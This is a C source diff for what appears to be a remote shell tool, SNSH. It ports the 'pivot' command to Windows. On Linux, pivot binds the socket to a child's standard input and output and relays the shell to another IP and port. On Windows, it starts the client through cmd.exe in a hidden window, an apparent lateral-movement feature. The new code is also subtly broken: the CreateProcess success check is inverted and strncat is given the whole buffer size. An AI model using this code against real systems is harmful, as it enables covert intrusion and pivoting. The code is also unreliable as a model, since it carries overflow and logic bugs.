@@ -46,8 +46,8 @@ char *builtin_str[][CMD_COUNT] = {
 #ifdef __linux__
 	{ "speak", "speaks the text you type.\r\n" },
 	{ "term", "launches a command that is not builtin.\r\n" },
-	{ "pivot", "launches a new SNSH_client.\r\n" },
 #endif
+	{ "pivot", "launches a new SNSH_client.\r\n" },
 	{ "help", "print this message.\r\n" },
 	{ "exit", "exit back to echo hello name.\r\n" }
 };
@@ -69,8 +69,8 @@ int (*builtin_func[])(int sockfd, char **args) = {
 #ifdef __linux__
 	&cmd_speak,
 	&cmd_term,
-	&cmd_pivot,
 #endif
+	&cmd_pivot,
 	&cmd_help,
 	&cmd_exit
 };
@@ -603,44 +603,90 @@ int cmd_term(int sockfd, char **args) {
 error:
 	return -1;
 }
+#endif
 
 /* cmd_pivot() - executes an external command.
  */
 int cmd_pivot(int sockfd, char **args) {
 	char data[BUFSIZ];
+
+#if defined(_WIN32) || (_WIN64)
+	if(args[1] != NULL && (args[2] == NULL || args[2] != NULL)) {
+		char cdir[BUFSIZ];
+		PROCESS_INFORMATION pi;
+		STARTUPINFO si;
+
+		ZeroMemory(&pi, sizeof(pi));
+		ZeroMemory(&si, sizeof(si));
+		si.cb = sizeof(STARTUPINFO);
+		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+		si.wShowWindow = FALSE;
+
+		if(getcwd(cdir, sizeof cdir) == NULL) {
+			memset(data, 0, sizeof data);
+			snprintf(data, sizeof data, "Error: Cannot get current working directory.\r\n");
+			ERROR_FIXED(send(sockfd, data, strlen(data), 0) != strlen(data),
+					"Cannot send data to client.\n");
+			return 1;
+		}
+
+		memset(data, 0, sizeof data);
+		snprintf(data, sizeof data, "C:\\Windows\\System32\\cmd.exe %s\\SNSH_client.exe",
+				cdir);
+		while(*++args != NULL) {
+			strncat(data, " ", sizeof data);
+			strncat(data, *args, sizeof data);
+		}
+
+		if(CreateProcess(NULL, data, NULL, NULL, TRUE, 0, NULL, &si, &pi) != 0) {
+			memset(data, 0, sizeof data);
+			snprintf(data, sizeof data, "Cannot create the process.\r\n");
+			ERROR_FIXED(send(sockfd, data, strlen(data), 0) != strlen(data),
+					"Cannot send data to client.\n");
+			return 1;
+		}
+
+		WaitForSingleObject(pi.hProcess, INFINITE);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+	} else {
+		memset(data, 0, sizeof data);
+		snprintf(data, sizeof data, "Usage: %s <ipaddress> [port]\r\n", args[0]);
+		ERROR_FIXED(send(sockfd, data, strlen(data), 0) != strlen(data),
+				"Cannot send data to client.\n");
+	}
+#elif __linux__
 	int pid = 0;
 
 	memset(data, 0, sizeof data);
-	if(args[0] == NULL) {
-	return -1;
-	} else if(args[1] == NULL) {
-	snprintf(data, sizeof data, "Usage: pivot <ipaddress> <port>\r\n");
-	ERROR_FIXED(send(sockfd, data, strlen(data), 0) != strlen(data),
-		"Cannot send data to client.");
-	} else {
-	if(args[1] != NULL && args[2] != NULL) {
-		pid = fork();
-		ERROR_FIXED(pid < 0, "Could not fork to background.\n");
-		if(pid == 0) {
-	dup2(sockfd, 0);
-	dup2(sockfd, 1);
-	dup2(sockfd, 2);
-	ERROR_FIXED(execvp("SNSH_client", args) < 0, "Could not execute command.\n");
-		} else {
-	waitpid(0, NULL, 0);
-		}
-	} else {
+	if(args[1] == NULL) {
 		snprintf(data, sizeof data, "Usage: pivot <ipaddress> <port>\r\n");
 		ERROR_FIXED(send(sockfd, data, strlen(data), 0) != strlen(data),
 			"Cannot send data to client.\n");
+	} else {
+		if(args[1] != NULL && args[2] != NULL) {
+			pid = fork();
+			ERROR_FIXED(pid < 0, "Could not fork to background.\n");
+			if(pid == 0) {
+				dup2(sockfd, 0);
+				dup2(sockfd, 1);
+				dup2(sockfd, 2);
+				ERROR_FIXED(execvp("SNSH_client", args) < 0, "Could not execute command.\n");
+			} else {
+				waitpid(0, NULL, 0);
+			}
+		} else {
+			snprintf(data, sizeof data, "Usage: pivot <ipaddress> <port>\r\n");
+			ERROR_FIXED(send(sockfd, data, strlen(data), 0) != strlen(data),
+				"Cannot send data to client.\n");
+		}
 	}
-	}
+#endif
 	return 1;
 
 error:
 	return -1;
 }
-#endif
 
 /* cmd_help() - displays help about the list of commands available.
  */
